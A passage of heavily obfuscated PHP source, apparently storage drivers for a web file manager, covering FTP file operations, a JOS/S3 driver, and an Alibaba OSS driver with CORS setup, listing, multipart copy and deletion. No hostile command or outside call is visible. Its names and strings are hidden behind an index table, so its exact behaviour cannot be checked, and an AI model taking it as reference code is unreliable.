„©ş¹†[$ñ”İêì™[234]] = $ „©ş¹†[$ñ”İêì™[88]] = 0; $ „©ş¹†[$ñ”İêì™[235]] = $ „©ş¹†[$ñ”İêì™[236]] = !0; $à¨Ï†óÓ = $this->iconvSystem($¥´ïå¤); $ „©ş¹†[$ñ”İêì™[88]] = @ftp_mdtm($this->connect, $à¨Ï†óÓ); if (empty($äÃµõ±—)) { $äÃµõ±— = $this->objectMeta($¥´ïå¤); if (!$äÃµõ±—) { return $ „©ş¹†; } } $ „©ş¹†[$ñ”İêì™[79]] = $äÃµõ±—[$ñ”İêì™[79]]; return $ „©ş¹†; } public function size($É–§Ì®®) { $€›¢ŞÄè = $this->objectMeta($É–§Ì®®); return $€›¢ŞÄè ? $€›¢ŞÄè[$_SERVER[ıÚ˜š²İ][79]] : 0; } public function info($Ô‰ÃˆÔÓ) { if ($this->isFile($Ô‰ÃˆÔÓ)) { return $this->fileInfo($Ô‰ÃˆÔÓ, 0); } else { if ($this->isFolder($Ô‰ÃˆÔÓ)) { return $this->folderInfo($Ô‰ÃˆÔÓ); } } return !1; } private function fileList($İÉ“°ÔÛ, &$ü·Íâ…Ø, &$Ã­’µ¶ä, $ËíŒŞßš = false) { $ƒÕ—¦˜Å =& $_SERVER[ıÚ˜š²İ]; $İÉ“°ÔÛ = $this->iconvSystem($İÉ“°ÔÛ); if (!$this->isFolder($İÉ“°ÔÛ)) { return !1; } $İÉ“°ÔÛ = rtrim($İÉ“°ÔÛ, $ƒÕ—¦˜Å[8]) . $ƒÕ—¦˜Å[8]; check_abort(); $»­æ¬öó = @ftp_rawlist($this->connect, $İÉ“°ÔÛ); if (!$»­æ¬öó) { $»­æ¬öó = array(); } $”“ü¨éé = array($ƒÕ—¦˜Å[10] => 1, $ƒÕ—¦˜Å[1377] => 1); foreach ($»­æ¬öó as $Ğë¾“ï®) { $ë“– Ó§ = $this->_listItem($Ğë¾“ï®); if ($ë“– Ó§[0] == $ƒÕ—¦˜Å[835]) { continue; } $àÒæı¨¼ = $ë“– Ó§[8]; if (empty($àÒæı¨¼) && $àÒæı¨¼ !== $ƒÕ—¦˜Å[231] || isset($”“ü¨éé[$àÒæı¨¼])) { continue; } $àÒæı¨¼ = $this->iconvApp($İÉ“°ÔÛ . ltrim($àÒæı¨¼, $ƒÕ—¦˜Å[8])); $²¦¬œ = array($ƒÕ—¦˜Å[32] => $àÒæı¨¼, $ƒÕ—¦˜Å[33] => $ƒÕ—¦˜Å[233], $ƒÕ—¦˜Å[79] => $ë“– Ó§[4]); if (substr($Ğë¾“ï®, 0, 1) == $ƒÕ—¦˜Å[1473]) { $²¦¬œ[$ƒÕ—¦˜Å[33]] = $ƒÕ—¦˜Å[78]; $²¦¬œ[$ƒÕ—¦˜Å[79]] = 0; } $ªÀ–òû² = $²¦¬œ[$ƒÕ—¦˜Å[33]] == $ƒÕ—¦˜Å[78] ? !0 : !1; $this->cacheMethodInfoSet($àÒæı¨¼, $ªÀ–òû², $²¦¬œ); if ($ªÀ–òû²) { $ü·Íâ…Ø[] = $àÒæı¨¼; if ($ËíŒŞßš) { $this->fileList($àÒæı¨¼, $ü·Íâ…Ø, $Ã­’µ¶ä, $ËíŒŞßš); } continue; } $Ã­’µ¶ä[] = $²¦¬œ; } $this->cacheMethodInfoSet($İÉ“°ÔÛ, !0); } private function _listItem($‹¼í©ÀË) { if (empty($‹¼í©ÀË)) { return array(); } $×©‡î… = preg_split($_SERVER[ıÚ˜š²İ][1474], $‹¼í©ÀË); if (count($×©‡î…) <= 9) { return $×©‡î…; } $×©‡î…[8] = trim(substr($‹¼í©ÀË, strpos($‹¼í©ÀË, $×©‡î…[7]) + strlen($×©‡î…[7]))); return array_splice($×©‡î…, 0, 9); } public function listPath($ëÖ¡ïŒ, $ïòìİé = false) { $ ÅŸû¦¥ =& $_SERVER[ıÚ˜š²İ]; if (!$this->_isconn()) { return !1; } $şÌš‹Û = $ùÁùÜœ = array(); $this->fileList($ëÖ¡ïŒ, $şÌš‹Û, $ùÁùÜœ); foreach ($şÌš‹Û as $²¤ÇÅÛ => $Èâ×Ÿ¿¹) { $şÌš‹Û[$²¤ÇÅÛ] = $this->folderInfo($Èâ×Ÿ¿¹, $ïòìİé); } foreach ($ùÁùÜœ as $²¤ÇÅÛ => $Èâ×Ÿ¿¹) { $ùÁùÜœ[$²¤ÇÅÛ] = $this->fileInfo($Èâ×Ÿ¿¹[$ ÅŸû¦¥[32]], $ïòìİé, $Èâ×Ÿ¿¹); } return array($ ÅŸû¦¥[85] => $şÌš‹Û, $ ÅŸû¦¥[86] => $ùÁùÜœ); } public function has($»Ñ«š‹º, $àµÁÜÈ— = false, $ó’Ğ¶È‰ = true) { $¤Ç°»¶Û =& $_SERVER[ıÚ˜š²İ]; $ú¿›²Á = $ñæ¥¡óê = array(); $“á—Ú²é = $àµÁÜÈ— ? !0 : !1; $this->fileList($»Ñ«š‹º, $ú¿›²Á, $ñæ¥¡óê, $“á—Ú²é); if ($àµÁÜÈ—) { return array($¤Ç°»¶Û[242] => count($ñæ¥¡óê), $¤Ç°»¶Û[243] => count($ú¿›²Á)); } if ($ó’Ğ¶È‰) { if (count($ñæ¥¡óê)) { return !0; } } else { if (count($ú¿›²Á)) { return !0; } } return !1; } public function listAll($ë“¹¡¾‚) { $×ÀÚ‘ê‘ =& $_SERVER[ıÚ˜š²İ]; if (!$this->_isconn()) { return !1; } $›³ÆÈï§ = $íõÂúÛ‹ = array(); $this->fileList($ë“¹¡¾‚, $›³ÆÈï§, $íõÂúÛ‹, !0); $ÆİÕñÊ = array_to_keyvalue($íõÂúÛ‹, $×ÀÚ‘ê‘[32]); foreach ($›³ÆÈï§ as $’ÎûÄÅÌ) { if (is_string($’ÎûÄÅÌ)) { $ÆİÕñÊ[$’ÎûÄÅÌ] = array($×ÀÚ‘ê‘[79] => 0); } } return $this->listAllFiles($ë“¹¡¾‚, $ÆİÕñÊ); } public function getContent($²‘Ò†‚µ) { if (!$this->_isconn()) { return !1; } $²‘Ò†‚µ = $this->iconvSystem($²‘Ò†‚µ); return $this->fileSubstr($²‘Ò†‚µ); } public function setContent($ÂéÏÔœ±, $§ÚöÆù€ = '') { if (!$this->_isconn()) { return !1; } $Åµ°¢Ø¹ = $this->pathThis($this->iconvSystem($ÂéÏÔœ±)); $€»¼ê”Ú = $this->tempFile($Åµ°¢Ø¹); file_put_contents($€»¼ê”Ú, $§ÚöÆù€); $¿‘…Şô = $this->upload($ÂéÏÔœ±, $this->iconvApp($€»¼ê”Ú)); $this->tempFileRemve($€»¼ê”Ú); return $¿‘…Şô; } public function fileSubstr($ı’š¡, $öƒ—şôÄ = 0, $ñÆ€–¶– = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($ı’š¡, $öƒ—şôÄ, $ñÆ€–¶–); } private function ftpRequest($åÈÄ±ƒ’, $îø»×» = 0, $÷ñ”» = false) { $¸ˆé»é =& $_SERVER[ıÚ˜š²İ]; $åÈÄ±ƒ’ = $¸ˆé»é[8] . ltrim(str_ltrim($åÈÄ±ƒ’, $this->ftpPath), $¸ˆé»é[8]); $åÈÄ±ƒ’ = $this->iconvSystem($åÈÄ±ƒ’); $ÓÒ‡©‡™ = $this->scheme . $this->host . $¸ˆé»é[4] . $this->port; $ùÙ°‚¾› = curl_init(); curl_setopt($ùÙ°‚¾›, CURLOPT_URL, $ÓÒ‡©‡™ . $this->pathEncode($åÈÄ±ƒ’)); curl_setopt($ùÙ°‚¾›, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($÷ñ”») { $ğ‡ï„öû = $îø»×» + $÷ñ”» - 1; curl_setopt($ùÙ°‚¾›, CURLOPT_RANGE, "{$îø»×»}\55{$ğ‡ï„öû}"); } curl_setopt($ùÙ°‚¾›, CURLOPT_RETURNTRANSFER, 1); $‡…‹¹ÙÀ = curl_exec($ùÙ°‚¾›); curl_close($ùÙ°‚¾›); return $‡…‹¹ÙÀ; } public function upload($Ù®Òîøò, $Ş”‰â§, $ª²›ğñî = false, $¯¦™¶Â = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($Ù®Òîøò))) { return !1; } $Ù®Òîøò = $this->iconvSystem($Ù®Òîøò); $Ş”‰â§ = $this->iconvSystem($Ş”‰â§); $›µºï Ç = ftp_nb_put($this->connect, $Ù®Òîøò, $Ş”‰â§, FTP_BINARY); while ($›µºï Ç == FTP_MOREDATA) { $›µºï Ç = ftp_nb_continue($this->connect); } if ($›µºï Ç != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[ıÚ˜š²İ][1472], !0); return !1; } return $this->getPathOuter($Ù®Òîøò); } public function download($öú œä‘, $Î»â¼« = '') { if (!$this->_isconn()) { return !1; } $­¶æÛƒ = $this->pathFather($Î»â¼«); if (!IO::mkdir($­¶æÛƒ)) { return !1; } $öú œä‘ = $this->iconvSystem($öú œä‘); $Î»â¼« = $this->iconvSystem($Î»â¼«); $´¤ñäá = ftp_nb_get($this->connect, $Î»â¼«, $öú œä‘, FTP_BINARY); while ($´¤ñäá == FTP_MOREDATA) { $´¤ñäá = ftp_nb_continue($this->connect); } if ($´¤ñäá != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[ıÚ˜š²İ][1472], !0); return !1; } return $this->iconvApp($Î»â¼«); } public function exist($’ğö±Ü) { return $this->isFile($’ğö±Ü) || $this->isFolder($’ğö±Ü); } public function isFile($¤Şø¡°Ò) { return !$this->isFolder($¤Şø¡°Ò) && $this->objectMeta($¤Şø¡°Ò); } public function isFolder($‚ İ­í„) { return $this->cacheMethod($_SERVER[ıÚ˜š²İ][180], $‚ İ­í„); } protected function objectMeta($Õ§ˆñ‚) { return $this->cacheMethod($_SERVER[ıÚ˜š²İ][182], $Õ§ˆñ‚); } protected function _objectMeta($ä•‡›¿¬) { $ŒÈÜÚ’Ú =& $_SERVER[ıÚ˜š²İ]; if ($ä•‡›¿¬ == $ŒÈÜÚ’Ú[12] || $ä•‡›¿¬ == $ŒÈÜÚ’Ú[8]) { return array(); } if (!$this->_isconn()) { return !1; } $ä•‡›¿¬ = $this->iconvSystem($ä•‡›¿¬); $€Êï¯¨‚ = array($ŒÈÜÚ’Ú[32] => $this->iconvApp($ä•‡›¿¬), $ŒÈÜÚ’Ú[33] => $ŒÈÜÚ’Ú[233], $ŒÈÜÚ’Ú[79] => 0); $´ °‰’ = @ftp_size($this->connect, $ä•‡›¿¬); if ($´ °‰’ != -1) { $€Êï¯¨‚[$ŒÈÜÚ’Ú[79]] = $´ °‰’; } else { $®»ğÅÉ× = @ftp_chdir($this->connect, $ä•‡›¿¬); if (!$®»ğÅÉ×) { return !1; } @ftp_chdir($this->connect, $ŒÈÜÚ’Ú[8]); $€Êï¯¨‚[$ŒÈÜÚ’Ú[33]] = $ŒÈÜÚ’Ú[78]; } return $€Êï¯¨‚; } protected function _isFolder($¸°™Ü³¹) { $ùù…şß =& $_SERVER[ıÚ˜š²İ]; if ($¸°™Ü³¹ == $ùù…şß[12] || $¸°™Ü³¹ == $ùù…şß[8]) { return !0; } $ºçœ‡ã¢ = $this->_objectMeta($¸°™Ü³¹); return isset($ºçœ‡ã¢[$ùù…şß[33]]) && $ºçœ‡ã¢[$ùù…şß[33]] == $ùù…şß[78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($Ğî÷ÏšŒ) { parent::__construct($Ğî÷ÏšŒ); $this->setSignVersion($_SERVER[ıÚ˜š²İ][250]); } public function uploadLink($—î©ëŞÚ, $–ÏÅ©š = 0) { $ç²ÂúÆ¼ =& $_SERVER[ıÚ˜š²İ]; if ($this->isUploadServer()) { return; } $Ÿş¦·–ş = $this->getType(); if (!in_array($Ÿş¦·–ş, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ÍœØ½Í = (!$–ÏÅ©š ? 1 : ceil($–ÏÅ©š / pow(1024, 3))) * 3600 * 4; $³ıÜ¤Ï• = $this->uploadMultiData($—î©ëŞÚ, $ÍœØ½Í); if ($³ıÜ¤Ï•) { $³ıÜ¤Ï•[$ç²ÂúÆ¼[97]] = $—î©ëŞÚ; $³ıÜ¤Ï•[$ç²ÂúÆ¼[98]] = $Ÿş¦·–ş; } return $³ıÜ¤Ï•; } public function fileOutImage($’±°öƒ¨, $Æğ÷ô²Ÿ = 250) { if ($this->size($’±°öƒ¨) > 1024 * 1024 * 25) { return $this->fileOutImageServer($’±°öƒ¨, $Æğ÷ô²Ÿ); } $“ëÉ» = $this->link($’±°öƒ¨); $“ëÉ» .= $_SERVER[ıÚ˜š²İ][1475] . $Æğ÷ô²Ÿ; $this->fileOutLink($“ëÉ»); } } goto Eäâêİ÷Î„; BŞå£„´‹™: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($øà€®’É) { parent::__construct(); include_once SDK_DIR . $_SERVER[ıÚ˜š²İ][1484]; $this->_init($øà€®’É); } public function _init($ì€Î±Ä) { $´Î…–ú =& $_SERVER[ıÚ˜š²İ]; $this->config = $ì€Î±Ä; foreach ($ì€Î±Ä as $·ªÆÜÔ’ => $å´èå†Í) { if (isset($this->{$·ªÆÜÔ’})) { $this->{$·ªÆÜÔ’} = $å´èå†Í; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($´Î…–ú[1485] . LNG($´Î…–ú[1486])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $Êâ‘…ïø =& $_SERVER[ıÚ˜š²İ]; $°†ëØÚ = new OSS\Model\CorsConfig(); $ÓæïŞ¡ı = new OSS\Model\CorsRule(); $ÓæïŞ¡ı->addAllowedOrigin($Êâ‘…ïø[1487]); $ÓæïŞ¡ı->addAllowedMethod($Êâ‘…ïø[1488]); $ÓæïŞ¡ı->addAllowedMethod($Êâ‘…ïø[1489]); $ÓæïŞ¡ı->addAllowedMethod($Êâ‘…ïø[1490]); $ÓæïŞ¡ı->addAllowedMethod($Êâ‘…ïø[1491]); $ÓæïŞ¡ı->addAllowedMethod($Êâ‘…ïø[165]); $ÓæïŞ¡ı->setMaxAgeSeconds(600); $ÓæïŞ¡ı->addExposeHeader($Êâ‘…ïø[1492]); $ÓæïŞ¡ı->addAllowedHeader($Êâ‘…ïø[1487]); $°†ëØÚ->addRule($ÓæïŞ¡ı); try { $this->client->putBucketCors($this->bucket, $°†ëØÚ); } catch (OSS\Core\OssException $£ıÊœˆ) { $this->writeLog(__FUNCTION__ . $Êâ‘…ïø[215] . $£ıÊœˆ->getMessage()); return !1; } return !0; } public function getBucketCors() { $ˆ®‰…õ• =& $_SERVER[ıÚ˜š²İ]; $àÌ„»¤ô = null; try { $àÌ„»¤ô = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $ü¶íë) { $this->writeLog(__FUNCTION__ . $ˆ®‰…õ•[215] . $ü¶íë->getMessage()); return null; } if (!$àÌ„»¤ô || !($ûîšãÅ’ = $àÌ„»¤ô->getRules())) { return null; } $¡Æ§û  = $ûîšãÅ’[0]->getAllowedOrigins(); $Ü­–Ìúö = $ûîšãÅ’[0]->getAllowedMethods(); $±©©…‰Â = $ûîšãÅ’[0]->getMaxAgeSeconds(); $ô˜¾ÏøÇ = $ûîšãÅ’[0]->getExposeHeaders(); $ö¤ãêàú = $ûîšãÅ’[0]->getAllowedHeaders(); return array($ˆ®‰…õ•[221] => isset($¡Æ§û [0]) ? $¡Æ§û [0] : $ˆ®‰…õ•[12], $ˆ®‰…õ•[225] => $Ü­–Ìúö, $ˆ®‰…õ•[1493] => $±©©…‰Â, $ˆ®‰…õ•[1494] => isset($ô˜¾ÏøÇ[0]) ? $ô˜¾ÏøÇ[0] : $ˆ®‰…õ•[12], $ˆ®‰…õ•[222] => isset($ö¤ãêàú[0]) ? $ö¤ãêàú[0] : $ˆ®‰…õ•[12]); } public function isBucketCors() { $Éç¢â‡ =& $_SERVER[ıÚ˜š²İ]; $•´¶ß£ = $this->getBucketCors(); if (!$•´¶ß£ || !is_array($•´¶ß£)) { return !1; } if ($•´¶ß£[$Éç¢â‡[221]] != $Éç¢â‡[223] || $•´¶ß£[$Éç¢â‡[222]] != $Éç¢â‡[223]) { return !1; } $ÙÄçèë° = array_map($Éç¢â‡[224], $•´¶ß£[$Éç¢â‡[225]]); if (!is_array($ÙÄçèë°)) { $ÙÄçèë° = array(); } $÷ª¬‹ç = array($Éç¢â‡[226], $Éç¢â‡[227], $Éç¢â‡[228], $Éç¢â‡[229], $Éç¢â‡[230]); $…ÔƒæË¸ = array_diff($÷ª¬‹ç, $ÙÄçèë°); return empty($…ÔƒæË¸); } public function mkfile($İÃîñ‘, $ö€ù‹´ = '', $û­áÆğÔ = REPEAT_RENAME) { $ÂìÃÔÜ’ = $this->setContent($İÃîñ‘, $ö€ù‹´); if ($ÂìÃÔÜ’ !== !1) { return $this->getPathOuter($İÃîñ‘); } return !1; } public function mkdir($ò¬±Îñ…, $æÆ¼¯ßê = REPEAT_SKIP) { if ($æÆ¼¯ßê && $this->_isFolder($ò¬±Îñ…)) { return $this->getPathOuter($ò¬±Îñ…); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ò¬±Îñ…)); } catch (OSS\Core\OssException $´íğÓõá) { $this->writeLog(__FUNCTION__ . $_SERVER[ıÚ˜š²İ][215] . $´íğÓõá->getMessage()); return !1; } return $this->getPathOuter($ò¬±Îñ…); } private function fileList($¸İˆ²¥‹, $µÔ˜¹£Ã = '', $şÑ”À¸ = 0) { $Ì«ù¸Ê• =& $_SERVER[ıÚ˜š²İ]; $¸İˆ²¥‹ = trim($¸İˆ²¥‹, $Ì«ù¸Ê•[8]); $‚ÇĞ–ÌÃ = empty($¸İˆ²¥‹) && $¸İˆ²¥‹ !== $Ì«ù¸Ê•[231] ? $Ì«ù¸Ê•[12] : $¸İˆ²¥‹ . $Ì«ù¸Ê•[8]; $¢ù‹‘Ò = $Ì«ù¸Ê•[12]; $¢•üğ‹÷ = 1000; $ë¯ßŠÆã = $¤Å‡‚Ëá = array(); while (!0) { check_abort(); $ÃõË°ûú = array($Ì«ù¸Ê•[1495] => $µÔ˜¹£Ã, $Ì«ù¸Ê•[1496] => $‚ÇĞ–ÌÃ, $Ì«ù¸Ê•[1497] => $¢•üğ‹÷, $Ì«ù¸Ê•[1498] => $¢ù‹‘Ò); try { $¶ñ“¦ÎÔ = $this->client->listObjects($this->bucket, $ÃõË°ûú); } catch (OSS\Core\OssException $°¶›Ç—º) { $this->writeLog(__FUNCTION__ . $Ì«ù¸Ê•[215] . $°¶›Ç—º->getMessage()); break; } $¢ù‹‘Ò = $¶ñ“¦ÎÔ->getNextMarker(); $é‡ÉË¿Ü = $¶ñ“¦ÎÔ->getObjectList(); $˜á‰”¨ = $¶ñ“¦ÎÔ->getPrefixList(); foreach ($é‡ÉË¿Ü as $¡¨‚È¦„) { if ($¡¨‚È¦„->getKey() == $‚ÇĞ–ÌÃ) { continue; } $²Çš·¼¬ = $¡¨‚È¦„->getKey(); $‚î§š¤ = $¡¨‚È¦„->getSize(); $ñŒ‰õÍ = $¡¨‚È¦„->getLastModified(); $õı®Èîò = trim($¡¨‚È¦„->getETag(), $Ì«ù¸Ê•[121]); $†Ù–Èúš = $şÑ”À¸ ? array($Ì«ù¸Ê•[32] => $²Çš·¼¬, $Ì«ù¸Ê•[79] => $‚î§š¤, $Ì«ù¸Ê•[207] => strtotime($ñŒ‰õÍ), $Ì«ù¸Ê•[1499] => $õı®Èîò) : $²Çš·¼¬; $íáäÕùŸ = $‚î§š¤ == 0 && substr($²Çš·¼¬, strlen($²Çš·¼¬) - 1, 1) == $Ì«ù¸Ê•[8] ? !0 : !1; $—ÍÉŠ˜ = array($Ì«ù¸Ê•[79] => $‚î§š¤, $Ì«ù¸Ê•[1500] => $‚î§š¤, $Ì«ù¸Ê•[88] => strtotime($ñŒ‰õÍ), $Ì«ù¸Ê•[1501] => $ñŒ‰õÍ, $Ì«ù¸Ê•[1499] => $õı®Èîò); $this->cacheMethodInfoSet($²Çš·¼¬, $íáäÕùŸ, $—ÍÉŠ˜); if ($íáäÕùŸ) { $ë¯ßŠÆã[] = $²Çš·¼¬; continue; } $¤Å‡‚Ëá[] = $†Ù–Èúš; } foreach ($˜á‰”¨ as $±²ªÍ‚) { $ë¯ßŠÆã[] = $±²ªÍ‚->getPrefix(); $this->cacheMethodInfoSet($±²ªÍ‚->getPrefix(), !0); } if ($¢ù‹‘Ò === $Ì«ù¸Ê•[12]) { break; } } $this->cacheMethodInfoSet($¸İˆ²¥‹, !0); return array($Ì«ù¸Ê•[85] => $ë¯ßŠÆã, $Ì«ù¸Ê•[86] => $¤Å‡‚Ëá); } public function listObject($¿óú“•Ü, $€Ö³¾Ëß = '') { $¸á…óĞç =& $_SERVER[ıÚ˜š²İ]; $¿óú“•Ü = trim($¿óú“•Ü, $¸á…óĞç[8]); $™óôñ°¬ = empty($¿óú“•Ü) && $¿óú“•Ü !== $¸á…óĞç[231] ? $¸á…óĞç[12] : $¿óú“•Ü . $¸á…óĞç[8]; $³ËÊ¤ = $¸á…óĞç[12]; $²ÔÁÈÛ = 1000; $ÓÂûğ‡à = $¤±²° = array(); while (!0) { check_abort(); $ùäıØ  = array($¸á…óĞç[1495] => $€Ö³¾Ëß, $¸á…óĞç[1496] => $™óôñ°¬, $¸á…óĞç[1497] => $²ÔÁÈÛ, $¸á…óĞç[1498] => $³ËÊ¤); try { $ÔãĞ€ƒ… = $this->client->listObjects($this->bucket, $ùäıØ ); } catch (OSS\Core\OssException $–Æ¤úÙƒ) { $this->writeLog(__FUNCTION__ . $¸á…óĞç[215] . $–Æ¤úÙƒ->getMessage()); break; } $³ËÊ¤ = $ÔãĞ€ƒ…->getNextMarker(); $ºôï¬æû = $ÔãĞ€ƒ…->getObjectList(); foreach ($ºôï¬æû as $×ò¾¸Üı) { if ($×ò¾¸Üı->getKey() == $™óôñ°¬) { continue; } $×…Ê­û÷ = $×ò¾¸Üı->getKey(); $úóÜ½´ï = $×ò¾¸Üı->getSize(); $¥ãÆóî = $úóÜ½´ï == 0 && substr($×…Ê­û÷, strlen($×…Ê­û÷) - 1, 1) == $¸á…óĞç[8] ? !0 : !1; if ($¥ãÆóî) { continue; } $¤±²°[] = $úóÜ½´ï . $¸á…óĞç[215] . $×…Ê­û÷; } if ($³ËÊ¤ === $¸á…óĞç[12]) { break; } } return array($¸á…óĞç[85] => $ÓÂûğ‡à, $¸á…óĞç[86] => $¤±²°); } public function copyFile($¿£Š¦‹‰, $Á½çò°š) { $ƒŸĞµÄŞ = $this->size($¿£Š¦‹‰); if ($ƒŸĞµÄŞ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $¿£Š¦‹‰, $this->bucket, $this->pathEncode($Á½çò°š)); } catch (OSS\Core\OssException $€ÌŠË…Ô) { $this->writeLog(__FUNCTION__ . $_SERVER[ıÚ˜š²İ][215] . $€ÌŠË…Ô->getMessage()); return !1; } return $this->getPathOuter($Á½çò°š); } $¢İšÇÀ = $this->multiCopyObject($¿£Š¦‹‰, $Á½çò°š, $ƒŸĞµÄŞ); return $¢İšÇÀ ? $this->getPathOuter($Á½çò°š) : !1; } private function multiCopyObject($™Ô¥¢–ı, $µ§éóÎñ, $½Ê×Ç¹) { $éØŞÆ• =& $_SERVER[ıÚ˜š²İ]; try { $é»…–˜¶ = array(); if ($Ú°˜í = $this->hashMd5($™Ô¥¢–ı)) { $é»…–˜¶ = array(OSS\OssClient::OSS_HEADERS => array($éØŞÆ•[1502] => $Ú°˜í)); } $²£ÃÎñı = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($µ§éóÎñ), $é»…–˜¶); $şùÃ³£­ = 1; $‚ˆÒì¿õ = 0; $áÙ¸ú°À = array(); $“ì”‹º = 1024 * 1024 * 10; $Ã»Ïäà‹ = $this->client->generateMultiuploadParts($½Ê×Ç¹, $“ì”‹º); foreach ($Ã»Ïäà‹ as $Ï‹‰àïÍ => $ËÃ¢ÒÍ˜) { $‚¶º˜÷§ = $‚ˆÒì¿õ + (int) $ËÃ¢ÒÍ˜[$éØŞÆ•[1503]]; $İ»µ‡ÅÉ = (int) $ËÃ¢ÒÍ˜[$éØŞÆ•[414]] + $‚¶º˜÷§ - 1; $×æóúø = array($éØŞÆ•[167] => $‚¶º˜÷§, $éØŞÆ•[168] => $İ»µ‡ÅÉ); $áÙ¸ú°À[] = $this->client->uploadPartCopy($this->bucket, $™Ô¥¢–ı, $this->bucket, $this->pathEncode($µ§éóÎñ), $şùÃ³£­, $²£ÃÎñı, $×æóúø); $şùÃ³£­ = $şùÃ³£­ + 1; } $„–¸áùÒ = array(); foreach ($áÙ¸ú°À as $Ï‹‰àïÍ => $ŞàÜˆšÀ) { $„–¸áùÒ[] = array($éØŞÆ•[300] => $Ï‹‰àïÍ + 1, $éØŞÆ•[301] => $ŞàÜˆšÀ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($µ§éóÎñ), $²£ÃÎñı, $„–¸áùÒ); } catch (OSS\Core\OssException $¼î™Í§) { $this->writeLog(__FUNCTION__ . $éØŞÆ•[215] . $¼î™Í§->getMessage()); return !1; } return !0; } public function moveFile($×÷şÉ€ , $ñ¯‡µŸ) { if ($this->copyFile($×÷şÉ€ , $ñ¯‡µŸ)) { $this->remove($×÷şÉ€ ); return $this->getPathOuter($ñ¯‡µŸ); } return !1; } public function delFile($èŞûùÓĞ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($èŞûùÓĞ)); } catch (OSS\Core\OssException $¨É¼£¤) { $this->writeLog(__FUNCTION__ . $_SERVER[ıÚ˜š²İ][215] . $¨É¼£¤->getMessage()); return !1; } return !0; } public function delFolder($İ›¨ï¿î) { $–ÒÒƒçê =& $_SERVER[ıÚ˜š²İ]; if (!$this->exist($İ›¨ï¿î)) { return !0; } $this->listItemCache = !1; $óêşë×¼ = $this->fileList($İ›¨ï¿î); $this->listItemCache = !0; $ƒ±”ß×å = trim($İ›¨ï¿î, $–ÒÒƒçê[8]) . $–ÒÒƒçê[8]; if (!empty($İ›¨ï¿î) && $İ›¨ï¿î !== $–ÒÒƒçê[231] && !in_array($ƒ±”ß×å, $óêşë×¼[$–ÒÒƒçê[85]])) { $óêşë×¼[$–ÒÒƒçê[85]][] = $ƒ±”ß×å; } $™Š›ñ÷¨ = $this->delByBatch($óêşë×¼[$–ÒÒƒçê[86]]); if (!$™Š›ñ÷¨) { return !1; } $™Š›ñ÷¨ = $this->delByBatch($óêşë×¼[$–ÒÒƒçê[85]]); if (!$™Š›ñ÷¨) { return !1; } return $this->delFile($ƒ±”ß×å); } private function delByBatch($ğ©ôÃÈ) { foreach (array_chunk($ğ©ôÃÈ, 1000) as $Ã¯êŒ´’) { try { $this->client->deleteObjects($this->bucket, $Ã¯êŒ´’); } catch (OSS\Core\OssException $¿š»ò±ß) { $this->writeLog(__FUNCTION__ . $_SERVER[ıÚ˜š²İ][215] . $¿š»ò±ß->getMessage()); return !1; } } return !0; } public function rename($éêÚ¢ª·, $ÁĞ›Äè²) { return $this->renameObject($éêÚ¢ª·, $ÁĞ›Äè²); } private function fileInfo($Ç¯ñ”¨, $Ö®ÇÈ‚Æ = false, $›ªŞÍÏ = array()) { $ãöØ»Å =& $_SERVER[ıÚ˜š²İ]; $öîÊ–š = array($ãöØ»Å[32] => $this->pathThis($Ç¯ñ”¨), $ãöØ»Å[87] => $this->getPathOuter($Ç¯ñ”¨), $ãöØ»Å[33] => $ãöØ»Å[233], $ãöØ»Å[79] => isset($›ªŞÍÏ[$ãöØ»Å[79]]) ? $›ªŞÍÏ[$ãöØ»Å[79]] : 0, $ãöØ»Å[169] => $this->ext($Ç¯ñ”¨)); if ($Ö®ÇÈ‚Æ) { return $öîÊ–š; } $öîÊ–š[$ãöØ»Å[234]] = $öîÊ–š[$ãöØ»Å[88]] = 0; $öîÊ–š[$ãöØ»Å[235]] = $öîÊ–š[$ãöØ»Å[236]] = !0; if (empty($›ªŞÍÏ)) { $™²ÖÌ— = $this->objectMeta($Ç¯ñ”¨); if (!$™²ÖÌ—) { return $öîÊ–š; } $›ªŞÍÏ = array($ãöØ»Å[88] => strtotime($™²ÖÌ—[$ãöØ»Å[1501]]), $ãöØ»Å[79] => $™²ÖÌ—[$ãöØ»Å[1500]] + 0, $ãöØ»Å[1499] => $™²ÖÌ—[$ãöØ»Å[1499]]); } if (isset($›ªŞÍÏ[$ãöØ»Å[1499]]) && $›ªŞÍÏ[$ãöØ»Å[1499]]) { $öîÊ–š[$ãöØ»Å[238]] = trim($›ªŞÍÏ[$ãöØ»Å[1499]], $ãöØ»Å[121]); } if (isset($›ªŞÍÏ[$ãöØ»Å[79]])) { $öîÊ–š[$ãöØ»Å[79]] = $›ªŞÍÏ[$ãöØ»Å[79]]; } if (isset($›ªŞÍÏ[$ãöØ»Å[88]])) { $öîÊ–š[$ãöØ»Å[88]] = $›ªŞÍÏ[$ãöØ»Å[88]]; } if (isset($›ªŞÍÏ[$ãöØ»Å[207]]) && !trim($öîÊ–š[$ãöØ»Å[88]])) { $öîÊ–š[$ãöØ»Å[88]] = $›ªŞÍÏ[$ãöØ»Å[207]]; } return $öîÊ–š; } private function folderInfo($ıÂ¡ğ€Ş, $¢ïÄÖäŸ = false, $‹åõƒûÑ = array()) { $áÕºìé‹ =& $_SERVER[ıÚ˜š²İ]; $˜Õ¸ğ‹ = array($áÕºìé‹[32] => 